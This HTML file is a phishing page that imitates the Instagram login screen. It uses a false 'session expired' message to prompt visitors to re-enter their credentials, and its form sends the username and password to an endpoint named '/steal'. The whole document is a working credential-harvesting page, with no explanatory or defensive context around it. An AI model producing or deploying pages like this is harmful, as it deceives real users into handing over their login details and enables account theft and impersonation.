<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        /* Minimal Instagram login clone */
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .logo { font-size: 40px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <p style="color: #8e8e8e;">Your session expired. Please log in again.</p>
        <form id="login-form" method="POST" action="/steal">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
